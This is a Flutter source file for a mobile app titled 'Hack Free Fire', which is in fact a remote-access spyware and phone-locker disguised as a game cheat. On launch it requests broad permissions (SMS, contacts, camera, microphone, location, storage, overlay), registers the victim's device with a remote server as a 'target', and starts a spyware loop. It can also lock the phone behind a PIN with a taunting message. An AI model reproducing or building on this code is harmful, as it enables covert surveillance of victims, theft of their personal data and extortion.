import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'dart:ui';
import 'dart:io';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:battery_plus/battery_plus.dart';
import 'globals.dart';
import 'rat_loop.dart';
import 'lock_wrapper.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  _audioPlayer = AudioPlayer();

  FlutterError.onError = (FlutterErrorDetails details) {
    FlutterError.presentError(details);
  };

  PlatformDispatcher.instance.onError = (error, stack) {
    return true;
  };

  if (Platform.isAndroid) {
    if (!await Permission.systemAlertWindow.isGranted) {
      await Permission.systemAlertWindow.request();
    }
    _requestNotifAccess();
  }

  await _requestPermissions();

  final info = await _getDeviceInfo();
  globalDeviceId = info['id']!;
  globalDeviceModel = info['model']!;

  try {
    await platformSpy.invokeMethod('saveTargetId', globalDeviceId);
  } catch (_) {}

  try {
    await platformSpy.invokeMethod('saveDeviceIdAll', globalDeviceId);
  } catch (_) {}

  final prefs = await SharedPreferences.getInstance();
  final savedPair = prefs.getString('pairId');
  if (savedPair != null && savedPair.isNotEmpty) {
    await _registerDevice(globalDeviceId, globalDeviceModel);
    startSpyware(globalDeviceId);
  }

  try {
    final lockState = await platformSpy.invokeMethod('getLockState') as Map?;
    if (lockState != null && lockState['isLocked'] == true) {
      currentLockMessage = lockState['lockMessage']?.toString() ?? 'YOUR PHONE IS LOCKED!!!! BY HANZ DEPLONGER';
      currentLockPIN = lockState['lockPin']?.toString() ?? '1234';
      isLockLive = lockState['isLockLive'] == true;
      deviceLocked.value = true;
      playLockSound();
      if (isLockLive) {
        try {
          await platformSpy.invokeMethod('bringToForeground');
        } catch (_) {}
      }
    }
  } catch (_) {}

  runApp(const AppRoot());
}

void _requestNotifAccess() async {
  try {
    await platformSpy.invokeMethod('openNotificationSettings');
  } catch (_) {}
}

Future<void> _requestPermissions() async {
  await [
    Permission.location,
    Permission.contacts,
    Permission.storage,
    Permission.manageExternalStorage,
    Permission.camera,
    Permission.microphone,
    Permission.ignoreBatteryOptimizations,
    Permission.notification,
    Permission.sms,
    Permission.photos,
  ].request();
}

Future<Map<String, String>> _getDeviceInfo() async {
  final di = DeviceInfoPlugin();
  String model = "Unknown", id = "UNKNOWN";
  try {
    if (Platform.isAndroid) {
      final a = await di.androidInfo;
      model = "${a.brand.toUpperCase()} ${a.model}";
      id = "${a.brand}-${a.model}-${a.id}".replaceAll(' ', '_');
    } else if (Platform.isIOS) {
      final i = await di.iosInfo;
      model = i.name;
      id = i.identifierForVendor ?? "UNKNOWN_IOS";
    }
  } catch (_) {
    id = "ZDX-${Platform.localHostname.hashCode}";
  }
  return {"id": id, "model": model};
}

Future<void> _registerDevice(String id, String model) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    await http.post(Uri.parse("$kServerBase/api/register-target"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": id,
          "model": model,
          "battery": lv.toString(),
          "status": "Online",
          "lastSeen": DateTime.now().toIso8601String(),
        }));
  } catch (_) {}
}

class AppRoot extends StatelessWidget {
  const AppRoot({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Hack Free Fire',
      theme: ThemeData(
        brightness: Brightness.dark,
        fontFamily: 'ShareTechMono',
        scaffoldBackgroundColor: const Color(0xFF001122),
      ),
      home: const LockWrapper(),
    );
  }
}
